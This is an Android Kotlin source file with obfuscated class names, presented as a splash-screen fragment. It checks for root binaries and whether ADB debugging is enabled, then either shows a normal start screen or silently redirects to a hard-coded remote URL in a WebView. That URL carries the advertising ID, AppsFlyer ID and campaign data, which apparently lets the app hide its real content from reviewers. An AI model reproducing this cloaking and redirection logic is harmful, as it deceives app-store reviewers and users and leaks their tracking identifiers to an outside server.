package com.dicsa.flasg.ui

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.View
import androidx.core.net.toUri
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import androidx.navigation.navOptions
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.dicsa.flasg.R
import com.dicsa.flasg.WebViewActivity
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.onesignal.OneSignal
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.core.Completable
import io.reactivex.rxjava3.core.Observable
import io.reactivex.rxjava3.core.Single
import io.reactivex.rxjava3.schedulers.Schedulers
import io.reactivex.rxjava3.subjects.BehaviorSubject
import kotlinx.coroutines.flow.*
import java.io.File

@SuppressLint("CustomSplashScreen")
class gffdgffgfdgfd : Fragment(R.layout.hdgfgfdfgfdgfd) {

    private val manager by lazy { Manager(requireContext()) }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        manager.isPlainUser.subscribe { isPlainUser ->
            if (isPlainUser) {
                manager.url.observeOn(AndroidSchedulers.mainThread())
                    .subscribe { result ->
                        Log.e("EXC", "Exception: $result")
                        requireActivity().runOnUiThread {
                            startWebView(result)
                        }
                    }
            } else {
                Completable.create {
                    findNavController().navigate(
                        R.id.startingFragment, null,
                        navOptions {
                            popUpTo(R.id.nav_graph) {
                                inclusive = true
                            }
                        }
                    )
                }.subscribeOn(AndroidSchedulers.mainThread()).subscribe()
            }
        }
    }

    private fun startWebView(url: String) {
        startActivity(
            Intent(requireContext(), WebViewActivity::class.java)
                .putExtra(
                    "url",
                    url
                )
        )

        requireActivity().finish()
    }
}

private sealed interface DataWrapper<out T> {
    object Starting : DataWrapper<Nothing>
    data class Data<T>(val value: T) : DataWrapper<T>
}

private class Manager(private val context: Context) {

    val isPlainUser = Single.create<Boolean> {
        it.onSuccess(checks() && tracks() != "1")
    }

    private fun checks(): Boolean {
        val places = arrayOf(
            "/sbin/", "/system/bin/", "/system/xbin/",
            "/data/local/xbin/", "/data/local/bin/",
            "/system/sd/xbin/", "/system/bin/failsafe/",
            "/data/local/"
        )
        try {
            for (where in places) {
                if (File(where + "su").exists()) return true
            }
        } catch (ignore: Throwable) {
        }
        return false
    }

    private fun tracks(): String {

        return Settings.Global.getString(context.contentResolver, Settings.Global.ADB_ENABLED)
            ?: "null"
    }

    private val appsFlyer = BehaviorSubject.create<DataWrapper<MutableMap<String, Any>?>>()

    private val facebookData = BehaviorSubject.create<DataWrapper<String?>>()
//    private val appsFlyer =
//        MutableStateFlow<DataWrapper<MutableMap<String, Any>?>>(DataWrapper.Starting)
//    private val facebookData = MutableStateFlow<DataWrapper<String?>>(DataWrapper.Starting)

    init {
        val listener = object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(p0: MutableMap<String, Any>?) {
                appsFlyer.onNext(DataWrapper.Data(p0))
            }

            override fun onConversionDataFail(p0: String?) {
            }

            override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            }

            override fun onAttributionFailure(p0: String?) {
            }
        }
        AppsFlyerLib.getInstance().init("jr3VsznHXJehekMnDYkm4V", listener, context)
        AppsFlyerLib.getInstance().start(context)

        AppLinkData.fetchDeferredAppLinkData(context) { data ->
            facebookData.onNext(DataWrapper.Data(data?.targetUri.toString()))
        }
    }

    private val data = appsFlyer.flatMap { appsFlyerData ->
        facebookData.map { facebook ->
            Pair(appsFlyerData, facebook)
        }
    }

    private val urlFromLocal = Single.create<DataWrapper<String>> { emitter ->
        emitter.onSuccess(
            context.getSharedPreferences("MyPref", Context.MODE_PRIVATE).getString("links", null)
                ?.let { DataWrapper.Data(it) } ?: DataWrapper.Starting
        )
    }

    private val urlFromRemote =
        data.map { Log.d("EXC", "first: ${it.first}, second: ${it.second}"); it }
            .filter { it.first is DataWrapper.Data && it.second is DataWrapper.Data }.map {
                val appsFlyerMap = (it.first as DataWrapper.Data).value
                val tempDeepLink = (it.second as DataWrapper.Data).value
                val deepLink = tempDeepLink?.replace("myapp://", "")
                val tempCompaign = appsFlyerMap?.get("campaign")
                val compaign = tempCompaign.toString().replace("||", "&")
                    .replace("_", "=")

                if (tempCompaign == "null" && deepLink.toString() == "null") {
                    OneSignal.sendTag("key2", "organic")
                } else if (tempCompaign != "null") {
                    OneSignal.sendTag(
                        "key2",
                        tempCompaign.toString().substringAfter("sub1_").substringBefore("||sub2")
                    )
                } else if (deepLink.toString() != "null") {
                    OneSignal.sendTag(
                        "key2",
                        tempDeepLink.toString().substringAfter("sub1_").substringBefore("||sub2")
                    )
                }

                val url = URL_VALUE.toUri().buildUpon().apply {
                    appendQueryParameter("gadid", getAdvId())
                    appendQueryParameter(
                        "af_id",
                        AppsFlyerLib.getInstance().getAppsFlyerUID(context)
                    )
                    appendQueryParameter("orig_cost", appsFlyerMap?.get("orig_cost").toString())
                    appendQueryParameter("adset_id", appsFlyerMap?.get("adset_id").toString())
                    appendQueryParameter("campaign_id", appsFlyerMap?.get("campaign_id").toString())
                    appendQueryParameter("source", appsFlyerMap?.get("media_source").toString())
                    appendQueryParameter("bundle", context.packageName)
                    appendQueryParameter("af_siteid", appsFlyerMap?.get("af_siteid").toString())
                    appendQueryParameter("currency", appsFlyerMap?.get("currency").toString())
                    appendQueryParameter("adset", encode(appsFlyerMap?.get("adset").toString()))
                    appendQueryParameter("adgroup", encode(appsFlyerMap?.get("adgroup").toString()))
                    if (deepLink != "null" && deepLink.toString().contains("sub")) {
                        appendQueryParameter(
                            "app_campaign",
                            encode(deepLink.toString().replace("||", "&").replace("_", "="))
                        )
                    } else {
                        val c = appsFlyerMap?.get("c")?.toString()
                        if (c != "null" && c.toString().contains("sub")) {
                            appendQueryParameter(
                                "app_campaign",
                                encode(c.toString().replace("||", "&").replace("_", "="))
                            )
                        } else {
                            appendQueryParameter(
                                "app_campaign",
                                encode(
                                    compaign
                                )
                            )
                        }
                    }
                }.build()
                Log.e("URL", url.toString())
                url.toString()
            }.subscribeOn(Schedulers.io())

    val url = urlFromLocal.flatMapObservable {
        Log.e("EXC", "CALLED $it")
        if (it is DataWrapper.Data) {
            Log.e("EXC", "CALLED1")
            Observable.just(it.value)
        } else {
            Log.e("EXC", "CALLED2")
            urlFromRemote
        }
    }

    private fun getAdvId(): String {
        val adInfo = AdvertisingIdClient.getAdvertisingIdInfo(context)
        val gadid = adInfo.id.toString()
        OneSignal.setExternalUserId(gadid)
        return gadid
    }

    private fun encode(string: String) = Uri.encode(string)

    companion object {
        private const val URL_VALUE = "https://trident.website/LvTHsHCQ"
    }
}
